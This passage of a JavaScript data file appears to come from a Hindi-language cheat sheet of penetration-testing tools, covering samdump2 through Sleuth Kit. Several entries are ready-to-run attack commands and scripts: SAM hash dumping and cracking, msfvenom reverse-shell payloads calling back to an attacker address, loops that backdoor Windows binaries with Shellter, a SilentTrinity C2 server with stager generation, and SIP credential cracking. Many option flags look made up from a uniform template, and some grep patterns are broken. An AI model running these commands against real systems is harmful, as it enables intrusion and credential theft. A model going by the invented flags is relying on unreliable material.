      { cmd: "samdump2 SYSTEM SAM", desc: "SAM हैश डंप करें" },
      { cmd: "samdump2 SYSTEM SAM -o hashes.txt", desc: "हैश फ़ाइल में सेव" },
      { cmd: "samdump2 /mnt/Windows/System32/config/SYSTEM /mnt/Windows/System32/config/SAM", desc: "Windows हाइव से डंप" },
      { cmd: "samdump2 SYSTEM SAM -v", desc: "वर्बोज़ SAM डंप" },
      { cmd: "samdump2 SYSTEM SAM -H", desc: "सिर्फ़ हैश दिखाएँ" },
      { cmd: "samdump2 SYSTEM SAM -u", desc: "सिर्फ़ यूज़र दिखाएँ" },
      { cmd: "samdump2 SYSTEM SAM -c -o users.csv", desc: "CSV फ़ॉर्मेट आउटपुट" },
      { cmd: "samdump2 SYSTEM SAM -d SECURITY", desc: "SECURITY हाइव के साथ" },
      { cmd: "samdump2 -f SYSTEM -s SAM -o creds.txt", desc: "लॉन्ग फ्लैग फ़ॉर्म" },
      { cmd: "samdump2 SYSTEM SAM -H -u", desc: "यूज़र और हैश ही" }
    ],
    advanced: [
      { cmd: "samdump2 SYSTEM SAM -v -o /tmp/hashes.txt 2>&1 | tee samdump.log", desc: "SAM डंप लॉग" },
      { cmd: "samdump2 SYSTEM SAM -v 2>&1 | grep -i 'admin\\|hash'", desc: "एडमिन हैश फ़िल्टर" },
      { cmd: "samdump2 -f SYSTEM -s SAM -d SECURITY -c > full_dump.csv", desc: "पूर्ण CSV डंप" },
      { cmd: "samdump2 SYSTEM SAM -H > nt_hashes.txt && john --format=nt nt_hashes.txt", desc: "हैश डंप और JTR क्रैक" },
      { cmd: "for hive in SYSTEM SAM SECURITY; do creddump -f $hive -o ${hive}_dump.txt; done", desc: "creddump के साथ संयोजन" }
    ],
    script: "echo 'Windows SAM डंप...'\nif [ -f SYSTEM ] && [ -f SAM ]; then\n  samdump2 SYSTEM SAM -v -o /tmp/windows_hashes.txt 2>&1 | tee /tmp/samdump.log\n  echo 'हैश /tmp/windows_hashes.txt में सेव'\nelse\n  echo 'SYSTEM और SAM फ़ाइलें चाहिए'\nfi"
  },
  Scalpel: {
    install: { pkg: "scalpel" },
    options: [
      ["-i <file>", "इनपुट फ़ाइल"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-n", "ड्राई रन"],
      ["-m", "मैजिक मोड"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"],
      ["-d", "डीबग"]
    ],
    basic: [
      { cmd: "scalpel -i disk.dd -o /recovered", desc: "फ़ाइल कार्विंग" },
      { cmd: "scalpel -i image.raw -o /output -c /etc/scalpel/scalpel.conf", desc: "कॉन्फ़िग के साथ कार्व" },
      { cmd: "scalpel -i evidence.dd -o /rec -v", desc: "वर्बोज़ फ़ाइल कार्व" },
      { cmd: "scalpel -i disk.img -o /output -q", desc: "शांत कार्विंग" },
      { cmd: "scalpel -i /dev/sdb -o /recovered", desc: "डिवाइस से कार्व" },
      { cmd: "scalpel -i image.dd -o /out -n", desc: "ड्राई रन परीक्षण" },
      { cmd: "scalpel -i evidence.dd -o /rec -m", desc: "मैजिक मोड कार्व" },
      { cmd: "scalpel -i disk.img -o /output -c /etc/scalpel.conf -v", desc: "वर्बोज़ कॉन्फ़िग कार्व" },
      { cmd: "scalpel -i image.dd -o /rec -d", desc: "डीबग मोड" },
      { cmd: "scalpel -i file.dd -o /tmp/carved", desc: "साधारण फ़ाइल कार्व" }
    ],
    advanced: [
      { cmd: "scalpel -i disk.dd -o /rec -c /etc/scalpel.conf -v 2>&1 | tee scalpel.log", desc: "पूर्ण कार्विंग लॉग" },
      { cmd: "scalpel -i disk.dd -o /rec -v 2>&1 | grep -i 'found\\|carved'", desc: "मिली फ़ाइलें मॉनिटर" },
      { cmd: "dc3dd if=/dev/sdb of=image.dd && scalpel -i image.dd -o /rec", desc: "इमेज लें और कार्व" },
      { cmd: "for f in *.dd *.img *.raw; do scalpel -i $f -o /rec_$(basename $f); done", desc: "एकाधिक फ़ाइल कार्व" },
      { cmd: "scalpel -i image.dd -o /rec -v 2>&1 | tail -10", desc: "अंतिम 10 कार्व आँकड़े" }
    ],
    script: "echo 'फ़ाइल कार्विंग शुरू...'\nmkdir -p /evidence/carved_$(date +%Y%m%d)\nscalpel -i /dev/sdb -o /evidence/carved_$(date +%Y%m%d) -c /etc/scalpel/scalpel.conf -v 2>&1 | tee /evidence/carve.log\nCOUNT=$(find /evidence/carved_$(date +%Y%m%d) -type f | wc -l)\necho \"कुल $COUNT फ़ाइलें कार्व\""
  },
  Scrcpy: {
    install: { pkg: "scrcpy" },
    options: [
      ["-s <serial>", "डिवाइस सीरियल"],
      ["-p <port>", "पोर्ट"],
      ["-m <size>", "मैक्स साइज़"],
      ["-b <rate>", "बिटरेट"],
      ["--max-fps <fps>", "मैक्स FPS"],
      ["--lock-video-orientation <n>", "ओरिएंटेशन लॉक"],
      ["--window-title <str>", "विंडो टाइटल"],
      ["-r <file>", "रिकॉर्ड फ़ाइल"],
      ["-f", "फ़ुलस्क्रीन"],
      ["--no-window", "बिना विंडो"]
    ],
    basic: [
      { cmd: "scrcpy", desc: "Android स्क्रीन मिरर" },
      { cmd: "scrcpy -s 192.168.1.100:5555", desc: "वायरलेस कनेक्ट" },
      { cmd: "scrcpy -m 1024", desc: "मैक्स 1024 रिज़ॉल्यूशन" },
      { cmd: "scrcpy -b 2M", desc: "2M बिटरेट" },
      { cmd: "scrcpy --max-fps 15", desc: "15 FPS सीमा" },
      { cmd: "scrcpy -r /tmp/screen.mp4", desc: "स्क्रीन रिकॉर्ड करें" },
      { cmd: "scrcpy -f", desc: "फ़ुलस्क्रीन मिरर" },
      { cmd: "scrcpy --lock-video-orientation 0", desc: "पोर्ट्रेट लॉक" },
      { cmd: "scrcpy --no-window -r output.mp4", desc: "हेडलेस रिकॉर्ड" },
      { cmd: "scrcpy -s emulator-5554", desc: "एमुलेटर कनेक्ट" }
    ],
    advanced: [
      { cmd: "scrcpy -s 192.168.1.100:5555 -m 1920 -b 8M --max-fps 30 -r recording.mp4 2>&1 | tee scrcpy.log", desc: "हाई-क्वालिटी मिरर रिकॉर्ड" },
      { cmd: "adb tcpip 5555 && adb connect 192.168.1.100:5555 && scrcpy -s 192.168.1.100:5555", desc: "वायरलेस सेटअप और मिरर" },
      { cmd: "scrcpy --no-window -r /tmp/test.mp4 2>&1 | grep -i 'error\\;connected'", desc: "हेडलेस रिकॉर्ड स्थिति" },
      { cmd: "for device in $(adb devices | grep device$ | awk '{print $1}'); do scrcpy -s $device &; done", desc: "एकाधिक डिवाइस मिरर" },
      { cmd: "scrcpy --lock-video-orientation 1 -m 720 -b 1M 2>&1", desc: "लैंडस्केप लो-बैंडविड्थ" }
    ],
    script: "echo 'Scrcpy शुरू...'\nadb devices | grep -q 'device$'\nif [ $? -eq 0 ]; then\n  scrcpy -m 1080 -b 4M --max-fps 30 -r /tmp/screen_$(date +%s).mp4 2>/dev/null &\n  echo 'स्क्रीन मिररिंग चल रही है'\nfi"
  },
  ShellNoob: {
    install: { pkg: "shell-noob" },
    options: [
      ["-f <file>", "शेलकोड फ़ाइल"],
      ["-t <type>", "प्रकार चुनें"],
      ["-a <arch>", "आर्किटेक्चर"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-c", "कन्वर्ट"],
      ["--from <fmt>", "से प्रारूप"],
      ["--to <fmt>", "को प्रारूप"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "shellnoob -f shellcode.bin", desc: "शेलकोड जानकारी" },
      { cmd: "shellnoob -f payload.bin -o payload.c --from bin --to c", desc: "BIN से C प्रारूप" },
      { cmd: "shellnoob -f shellcode.asm -o shellcode.bin", desc: "ASM से बाइनरी" },
      { cmd: "shellnoob -f shellcode.bin --to python", desc: "BIN से Python प्रारूप" },
      { cmd: "shellnoob -f sc.txt --to javascript", desc: "BIN से JS प्रारूप" },
      { cmd: "shellnoob -f shellcode.bin -a x64", desc: "x64 शेलकोड जानकारी" },
      { cmd: "shellnoob -f payload.c -o payload.bin --from c --to bin", desc: "C से BIN प्रारूप" },
      { cmd: "shellnoob -f shellcode.bin -v", desc: "वर्बोज़ शेलकोड जानकारी" },
      { cmd: "shellnoob -f shellcode.bin -s", desc: "साइलेंट मोड" },
      { cmd: "shellnoob -f sc.bin --to hex", desc: "BIN से HEX प्रारूप" }
    ],
    advanced: [
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw | shellnoob -f - --to python", desc: "MSF पेलोड से Python" },
      { cmd: "shellnoob -f payload.bin --to c --to python --to javascript -o multi.txt 2>&1 | tee shellnoob.log", desc: "एकाधिक प्रारूप" },
      { cmd: "echo '\\x31\\xc0\\x50\\x68' | shellnoob -f - --to asm -a x64", desc: "हेक्स से ASM" },
      { cmd: "for fmt in c python javascript ruby; do shellnoob -f payload.bin --to $fmt -o payload.$fmt; done", desc: "सभी प्रारूप कन्वर्ट" },
      { cmd: "shellnoob -f shellcode.bin --to hex 2>&1 | tr -d '\\n' | wc -c", desc: "HEX शेलकोड की लंबाई" }
    ],
    script: "echo 'शेलकोड रूपांतरण...'\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o /tmp/shellcode.bin 2>/dev/null\nshellnoob -f /tmp/shellcode.bin --to c --to python --to hex -o /tmp/converted 2>/dev/null\necho 'शेलकोड /tmp/converted में'"
  },
  Shellter: {
    install: { pkg: "shellter" },
    options: [
      ["-a", "ऑटो मोड"],
      ["-p <file>", "पीई फ़ाइल"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["--norun", "न चलाएँ"],
      ["-e <file>", "एक्सट्रैक्ट"],
      ["-r", "रिकवरी"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "shellter -a -p putty.exe -l 192.168.1.10 -P 4444", desc: "स्वचालित PE बैकडोर" },
      { cmd: "shellter -p install.exe -l 192.168.1.10 -P 8080", desc: "कस्टम पोर्ट बैकडोर" },
      { cmd: "shellter -a -p teamviewer.exe -l example.com -P 443", desc: "HTTPS पोर्ट बैकडोर" },
      { cmd: "shellter -p calc.exe -l 192.168.1.10 -P 4444 -s", desc: "साइलेंट बैकडोर" },
      { cmd: "shellter -p winword.exe -l 192.168.1.10 -P 4444 -v", desc: "वर्बोज़ बैकडोर" },
      { cmd: "shellter -a -p cmd.exe -l 192.168.1.10 -P 53", desc: "DNS पोर्ट बैकडोर" },
      { cmd: "shellter -p notepad.exe -l 192.168.1.10 -P 4444 --norun", desc: "बिना चलाए बैकडोर" },
      { cmd: "shellter -a -p /usr/share/windows-binaries/putty.exe -l 192.168.1.10 -P 4444", desc: "Kali बाइनरी बैकडोर" },
      { cmd: "shellter -p backup.exe -l 10.0.0.1 -P 9999", desc: "इंटरनल नेट बैकडोर" },
      { cmd: "shellter -e infected.exe -o clean.exe", desc: "बैकडोर निकालें" }
    ],
    advanced: [
      { cmd: "shellter -a -p /usr/share/windows-binaries/putty.exe -l 192.168.1.10 -P 4444 -v 2>&1 | tee shellter.log", desc: "वर्बोज़ बैकडोर लॉग" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe && shellter -a -p shell.exe -l 192.168.1.10 -P 4444", desc: "MSF पेलोड और Shellter" },
      { cmd: "shellter -p putty.exe -l 192.168.1.10 -P 4444 -s 2>&1 | grep -i 'success\\|error'", desc: "सफलता/त्रुटि फ़िल्टर" },
      { cmd: "for f in *.exe; do shellter -a -p $f -l 192.168.1.10 -P 4444 -s; done", desc: "एकाधिक EXE बैकडोर" },
      { cmd: "shellter -a -p putty.exe -l 192.168.1.10 -P 4444 --norun && file putty.exe", desc: "बैकडोर और फ़ाइल वेरिफ़ाई" }
    ],
    script: "echo 'Shellter बैकडोर इंजेक्शन...'\ncd /usr/share/windows-binaries\nfor binary in putty.exe notepad.exe cmd.exe; do\n  if [ -f $binary ]; then\n    shellter -a -p $binary -l 192.168.1.10 -P 4444 -s 2>/dev/null && echo '$binary इंफेक्टेड'\n  fi\ndone\necho 'बैकडोर तैयार'"
  },
  Showmount: {
    install: { pkg: "showmount" },
    options: [
      ["-e <host>", "NFS एक्सपोर्ट सूची"],
      ["-a <host>", "माउंटेड सूची"],
      ["-d <host>", "डायरेक्टरी सूची"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"],
      ["-p <port>", "पोर्ट"],
      ["-4", "IPv4"],
      ["-6", "IPv6"],
      ["-o <file>", "आउटपुट"]
    ],
    basic: [
      { cmd: "showmount -e 192.168.1.100", desc: "NFS एक्सपोर्ट सूची" },
      { cmd: "showmount -a 192.168.1.100", desc: "माउंटेड NFS सूची" },
      { cmd: "showmount -e example.com", desc: "डोमेन NFS एक्सपोर्ट" },
      { cmd: "showmount -d 192.168.1.100", desc: "NFS डायरेक्टरी सूची" },
      { cmd: "showmount -e 192.168.1.100 -v", desc: "वर्बोज़ NFS एक्सपोर्ट" },
      { cmd: "showmount -e 192.168.1.100 -o nfs_shares.txt", desc: "एक्सपोर्ट फ़ाइल में" },
      { cmd: "showmount -e 192.168.1.100 -4", desc: "IPv4 NFS स्कैन" },
      { cmd: "showmount -e 192.168.1.100 -p 2049", desc: "पोर्ट 2049 NFS" },
      { cmd: "rpcinfo -p 192.168.1.100 | grep nfs && showmount -e 192.168.1.100", desc: "RPC NFS जाँच और माउंट" },
      { cmd: "showmount -e 10.0.0.1", desc: "दूसरा सबनेट" }
    ],
    advanced: [
      { cmd: "showmount -e 192.168.1.100 -v 2>&1 | tee showmount.log", desc: "NFS स्कैन लॉग" },
      { cmd: "showmount -e 192.168.1.100 2>&1 | grep -i 'export' | awk '{print $1}'", desc: "एक्सपोर्ट पथ फ़िल्टर" },
      { cmd: "for ip in $(seq 1 254); do showmount -e 192.168.1.$ip 2>/dev/null; done > nfs_all.txt", desc: "सबनेट NFS स्कैन" },
      { cmd: "rpcinfo -p 192.168.1.100 | grep -i 'nfs\\|mount' | awk '{print $2}'", desc: "NFS पोर्ट खोजें" },
      { cmd: "showmount -e 192.168.1.100 && mkdir /mnt/nfs && mount -t nfs 192.168.1.100:/share /mnt/nfs", desc: "NFS माउंट और एक्सेस" }
    ],
    script: "echo 'NFS एनुमरेशन...'\nnmap -sS -p 2049 192.168.1.0/24 -oG - 2>/dev/null | grep 'open' | awk '{print $2}' > /tmp/nfs_hosts.txt\nwhile read host; do\n  echo \"=== $host ===\" >> /tmp/nfs_exports.txt\n  showmount -e $host -v >> /tmp/nfs_exports.txt 2>/dev/null\ndone < /tmp/nfs_hosts.txt\necho 'NFS जानकारी /tmp/nfs_exports.txt में'"
  },
  SidGuess: {
    install: { pkg: "sid-guess" },
    options: [
      ["-i <host>", "लक्ष्य होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-s <start>", "स्टार्ट RID"],
      ["-e <end>", "एंड RID"],
      ["-d <domain>", "डोमेन"],
      ["-u <user>", "यूज़र"],
      ["-P <pass>", "पासवर्ड"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sidguess -i 192.168.1.100", desc: "SID ब्रूटफ़ोर्स शुरू" },
      { cmd: "sidguess -i 192.168.1.100 -s 500 -e 1000", desc: "RID रेंज 500-1000" },
      { cmd: "sidguess -i 192.168.1.100 -d DOMAIN -u admin -P pass", desc: "प्रमाणीकृत SID गेस" },
      { cmd: "sidguess -i 192.168.1.100 -p 445", desc: "पोर्ट 445 SID गेस" },
      { cmd: "sidguess -i 192.168.1.100 -v", desc: "वर्बोज़ SID गेस" },
      { cmd: "sidguess -i 192.168.1.100 -q", desc: "शांत मोड" },
      { cmd: "sidguess -i 192.168.1.100 -s 1000 -e 2000", desc: "RID 1000-2000 रेंज" },
      { cmd: "sidguess -i example.com", desc: "डोमेन SID गेस" },
      { cmd: "sidguess -i 192.168.1.100 -d WORKGROUP -u guest -P ''", desc: "गेस्ट SID गेस" },
      { cmd: "sidguess -i 192.168.1.100 -s 500 -e 1500 -v", desc: "RID 500-1500 वर्बोज़" }
    ],
    advanced: [
      { cmd: "sidguess -i 192.168.1.100 -s 500 -e 2000 -v 2>&1 | tee sidguess.log", desc: "SID ब्रूटफ़ोर्स लॉग" },
      { cmd: "sidguess -i 192.168.1.100 -v 2>&1 | grep -i 'found\\;user'", desc: "मिले यूज़र फ़िल्टर" },
      { cmd: "for domain in DOMAIN WORKGROUP; do sidguess -i 192.168.1.100 -d $domain -u admin -P pass -s 500 -e 1000; done", desc: "दोनों डोमेन परीक्षण" },
      { cmd: "sidguess -i 192.168.1.100 -s 500 -e 5000 -q 2>&1 | grep -E 'S-1-'", desc: "SID फ़िल्टर" },
      { cmd: "nmap -sS -p 445 192.168.1.100 && sidguess -i 192.168.1.100 -s 500 -e 3000 -v", desc: "SMB पोर्ट स्कैन और SID गेस" }
    ],
    script: "echo 'SID ब्रूटफ़ोर्सिंग...'\nsidguess -i 192.168.1.100 -s 500 -e 5000 -v 2>&1 | tee /tmp/sid.txt\ngrep 'found' /tmp/sid.txt | awk '{print $NF}' > /tmp/windows_users.txt\necho 'यूज़र /tmp/windows_users.txt में'"
  },
  SignApk: {
    install: { pkg: "sign-apk" },
    options: [
      ["-k <file>", "कीस्टोर फ़ाइल"],
      ["-p <pass>", "कीस्टोर पास"],
      ["-a <alias>", "एलियास"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-c <cert>", "सर्टिफ़िकेट"],
      ["-e", "एक्सपायरी"],
      ["-d <algo>", "डाइजेस्ट एल्गोरिदम"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "signapk -k keystore.jks -p pass -a alias app.apk signed.apk", desc: "APK साइन करें" },
      { cmd: "signapk -k debug.keystore -p android -a androiddebugkey app.apk signed.apk", desc: "डीबग की से साइन" },
      { cmd: "signapk -k mykey.jks -p secret -a myalias app.apk signed.apk -v", desc: "वर्बोज़ APK साइन" },
      { cmd: "signapk -k keystore.jks -p pass -a alias app.apk signed.apk -s", desc: "साइलेंट साइन" },
      { cmd: "signapk -k key.p12 -p pass -a alias -c cert.pem app.apk signed.apk", desc: "PKCS12 और सर्टिफ़िकेट" },
      { cmd: "apksigner sign --ks keystore.jks --ks-key-alias alias app.apk", desc: "apksigner से साइन" },
      { cmd: "apksigner verify signed.apk", desc: "APK साइन वेरिफ़ाई" },
      { cmd: "signapk -k keystore.jks -p pass -a alias -e 36500 app.apk signed.apk", desc: "100 साल एक्सपायरी" },
      { cmd: "signapk -k keystore.jks -p pass -a alias -d sha256 app.apk signed.apk", desc: "SHA256 डाइजेस्ट" },
      { cmd: "jarsigner -keystore keystore.jks -storepass pass -keypass pass app.apk alias", desc: "jarsigner से साइन" }
    ],
    advanced: [
      { cmd: "keytool -genkey -keystore mykey.jks -alias key -keyalg RSA -keysize 2048 -validity 365 && signapk -k mykey.jks -p pass -a key app.apk signed.apk", desc: "की जनरेट और APK साइन" },
      { cmd: "signapk -k debug.keystore -p android -a androiddebugkey app.apk signed.apk -v 2>&1 | tee sign.log", desc: "वर्बोज़ साइन लॉग" },
      { cmd: "apksigner sign --ks keystore.jks --ks-key-alias alias --v1-signing-enabled true --v2-signing-enabled true app.apk", desc: "apksigner V1+V2 साइन" },
      { cmd: "for apk in *.apk; do signapk -k keystore.jks -p pass -a alias $apk signed_$apk; done", desc: "एकाधिक APK साइन" },
      { cmd: "zipalign -v 4 app.apk aligned.apk && signapk -k key.jks -p pass -a alias aligned.apk signed.apk", desc: "ज़िपएलाइन और साइन" }
    ],
    script: "echo 'APK साइनिंग...'\nkeytool -genkey -keystore /tmp/signkey.jks -alias pentest -keyalg RSA -keysize 2048 -validity 3650 -storepass pass -keypass pass -dname 'CN=Test' 2>/dev/null\nfor apk in *.apk; do\n  signapk -k /tmp/signkey.jks -p pass -a pentest $apk \"signed_$(basename $apk .apk).apk\" 2>/dev/null\ndone\necho 'साइनिंग पूर्ण'"
  },
  SilentTrinity: {
    install: { pkg: "silent-trinity" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-c <cmd>", "कमांड"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337", desc: "C2 सर्वर शुरू" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337 -l 192.168.1.10 -P 4444", desc: "लिसनर सेट C2" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 443 -v", desc: "HTTPS C2 सर्वर" },
      { cmd: "silent-trinity -c 'generate stager python'", desc: "Python स्टेजर जनरेट" },
      { cmd: "silent-trinity -s example.com -p 1337", desc: "डोमेन C2 सर्वर" },
      { cmd: "silent-trinity -c 'list'", desc: "सत्र सूची देखें" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337 -d", desc: "डीबग C2 मोड" },
      { cmd: "silent-trinity -r /etc/silent-trinity/config.json", desc: "कॉन्फ़िग फ़ाइल से" },
      { cmd: "silent-trinity -c 'generate stager powershell'", desc: "PowerShell स्टेजर" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 9999 -q", desc: "शांत C2" }
    ],
    advanced: [
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337 -l 192.168.1.10 -P 4444 -v 2>&1 | tee st.log", desc: "C2 सर्वर लॉग" },
      { cmd: "silent-trinity -c 'generate stager msbuild' > stager.xml", desc: "MSBuild स्टेजर जनरेट" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337 -v 2>&1 | grep -i 'session\\;connect'", desc: "सेशन कनेक्शन मॉनिटर" },
      { cmd: "silent-trinity -c 'generate stager python; exit' | silent-trinity -s 0.0.0.0 -p 1337", desc: "पाइप से स्टेजर जनरेट" },
      { cmd: "silent-trinity -s 0.0.0.0 -p 1337 -v 2>&1 | awk '/session|agent/{print}'", desc: "एजेंट सत्र फ़िल्टर" }
    ],
    script: "echo 'SilentTrinity C2 शुरू...'\nsilent-trinity -s 0.0.0.0 -p 1337 -l 192.168.1.10 -P 4444 -v 2>&1 | tee /tmp/st_c2.log &\nC2_PID=$!\nsleep 3\necho \"C2 PID: $C2_PID on port 1337\"\nsilent-trinity -c 'generate stager python' > /tmp/stager.py 2>/dev/null"
  },
  SipCrack: {
    install: { pkg: "sip-crack" },
    options: [
      ["-f <file>", "PCAP फ़ाइल"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-o <file>", "आउटपुट"],
      ["-u <user>", "यूज़र फ़िल्टर"],
      ["-r <rate>", "रेट लिमिट"],
      ["-t <type>", "हैश प्रकार"],
      ["-p <port>", "पोर्ट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "sipcrack -f sip.pcap -w /usr/share/wordlists/rockyou.txt", desc: "SIP क्रेडेंशियल क्रैक" },
      { cmd: "sipcrack -f capture.pcap -w wordlist.txt -v", desc: "वर्बोज़ SIP क्रैक" },
      { cmd: "sipcrack -f sip_auth.pcap -w dict.txt -o cracked.txt", desc: "क्रैक परिणाम फ़ाइल" },
      { cmd: "sipcrack -f voip.pcap -w /usr/share/wordlists/rockyou.txt -s", desc: "साइलेंट SIP क्रैक" },
      { cmd: "sipcrack -f sip.pcap -w wordlist.txt -u admin", desc: "एडमिन SIP क्रैक" },
      { cmd: "sipcrack -f sip.pcap -w pass.txt -v -o found.txt", desc: "वर्बोज़ आउटपुट फ़ाइल" },
      { cmd: "sipcrack -f auth.pcap -w /usr/share/wordlists/rockyou.txt -r 10", desc: "रेट लिमिट 10" },
      { cmd: "sipcrack -f sip.pcap -t md5 -w wordlist.txt", desc: "MD5 SIP क्रैक" },
      { cmd: "sipcrack -f sip_traffic.pcap -w words.txt", desc: "SIP ट्रैफ़िक क्रैक" },
      { cmd: "sipcrack -f sip.pcap -w /usr/share/wordlists/fasttrack.txt", desc: "Fasttrack SIP क्रैक" }
    ],
    advanced: [
      { cmd: "sipcrack -f sip.pcap -w /usr/share/wordlists/rockyou.txt -v -o result.txt 2>&1 | tee sipcrack.log", desc: "SIP क्रैक पूर्ण लॉग" },
      { cmd: "tcpdump -i eth0 -w sip.pcap 'port 5060' & sipcrack -f sip.pcap -w wordlist.txt", desc: "कैप्चर और SIP क्रैक" },
      { cmd: "sipcrack -f sip.pcap -v 2>&1 | grep -i 'found\\;password'", desc: "मिले पासवर्ड फ़िल्टर" },
      { cmd: "for dict in /usr/share/wordlists/*.txt; do sipcrack -f sip.pcap -w $dict -q; done", desc: "सभी डिक्शनरी SIP क्रैक" },
      { cmd: "sipcrack -f sip.pcap -w /usr/share/wordlists/rockyou.txt -v 2>&1 | tail -10", desc: "अंतिम क्रैक स्थिति" }
    ],
    script: "echo 'SIP क्रेडेंशियल क्रैकिंग...'\nsipcrack -f /tmp/sip_capture.pcap -w /usr/share/wordlists/rockyou.txt -v -o /tmp/sip_cracked.txt 2>&1 | tee /tmp/sipcrack.log\ngrep -i 'found' /tmp/sipcrack.log && echo 'SIP क्रेडेंशियल मिले'"
  },
  Skipfish: {
    install: { pkg: "skipfish" },
    options: [
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-S <file>", "वर्डलिस्ट"],
      ["-I <str>", "इन्क्लूड URL"],
      ["-X <str>", "एक्सक्लूड URL"],
      ["-W <rate>", "कॉन्करेंसी"],
      ["-L <limit>", "रिक्वेस्ट लिमिट"],
      ["-t <sec>", "टाइमआउट"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "skipfish -o /report http://example.com", desc: "Skipfish वेब स्कैन" },
      { cmd: "skipfish -o /report -S /usr/share/skipfish/dictionaries/complete.wl http://example.com", desc: "पूर्ण वर्डलिस्ट स्कैन" },
      { cmd: "skipfish -o /report -I http://example.com/admin http://example.com", desc: "विशिष्ट पथ स्कैन" },
      { cmd: "skipfish -o /report -W 100 http://example.com", desc: "100 कॉन्करेंट स्कैन" },
      { cmd: "skipfish -o /report -L 10000 http://example.com", desc: "10k रिक्वेस्ट लिमिट" },
      { cmd: "skipfish -o /report -t 30 http://example.com", desc: "30 सेकंड टाइमआउट" },
      { cmd: "skipfish -o /report -v http://example.com", desc: "वर्बोज़ स्कैन" },
      { cmd: "skipfish -o /report -q http://example.com", desc: "शांत स्कैन" },
      { cmd: "skipfish -o /report -X .gif http://example.com", desc: "GIF बाहर करें" },
      { cmd: "skipfish -o /report -S medium.wl http://example.com", desc: "मध्यम वर्डलिस्ट" }
    ],
    advanced: [
      { cmd: "skipfish -o /report -S /usr/share/skipfish/dictionaries/complete.wl -W 200 -v http://example.com 2>&1 | tee skipfish.log", desc: "तेज़ पूर्ण स्कैन लॉग" },
      { cmd: "skipfish -o /report -I http://example.com/login -X .png,.jpg http://example.com -v 2>&1 | grep -i 'issue\\;vuln'", desc: "लॉगिन पेज स्कैन" },
      { cmd: "skipfish -o /report -L 50000 -W 50 -q http://example.com && cat /report/index.html", desc: "50k रिक्वेस्ट स्कैन" },
      { cmd: "for site in $(cat targets.txt); do skipfish -o /reports/$(echo $site | tr '/' '_') -q $site; done", desc: "एकाधिक साइट स्कैन" },
      { cmd: "skipfish -o /report -v http://example.com 2>&1 | awk '{print $4}' | sort | uniq -c | sort -rn", desc: "HTTP स्थिति कोड आँकड़े" }
    ],
    script: "echo 'Skipfish वेब स्कैन...'\nskipfish -o /tmp/skipfish_report -S /usr/share/skipfish/dictionaries/complete.wl -W 100 -v $1 2>&1 | tee /tmp/skipfish.log\necho 'रिपोर्ट: /tmp/skipfish_report/index.html'"
  },
  SleuthKit: {
    install: { pkg: "sleuth-kit" },
    options: [
      ["-i <img>", "इमेज फ़ाइल"],
      ["-o <offset>", "ऑफ़सेट"],
      ["-t <type>", "फ़ाइल सिस्टम प्रकार"],
      ["-p <part>", "पार्टीशन"],
      ["-d <dir>", "आउटपुट डायरेक्टरी"],
      ["-v", "वर्बोज़"],
      ["-r", "रीकर्सिव"],
      ["-l", "लिस्ट मोड"],
      ["-f <file>", "फ़ाइल नाम"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "fls -o 2048 disk.dd", desc: "फ़ाइल सिस्टम सूची" },
      { cmd: "fls -r disk.dd", desc: "रीकर्सिव फ़ाइल सूची" },
      { cmd: "icat disk.dd 2 > file.txt", desc: "इनोड से फ़ाइल निकालें" },
      { cmd: "mmls disk.dd", desc: "पार्टीशन टेबल दिखाएँ" },
      { cmd: "fsstat -o 2048 disk.dd", desc: "फ़ाइल सिस्टम आँकड़े" },
      { cmd: "istat disk.dd 2", desc: "इनोड जानकारी" },
      { cmd: "blkstat disk.dd 100", desc: "ब्लॉक जानकारी" },
      { cmd: "jls disk.dd", desc: "जर्नल प्रविष्टियाँ" },
      { cmd: "fls -d -r disk.dd > deleted_files.txt", desc: "डिलीट फ़ाइलें सूची" },
      { cmd: "srch_strings -a disk.dd | grep -i 'password'", desc: "इमेज में स्ट्रिंग खोज" }
    ],
    advanced: [
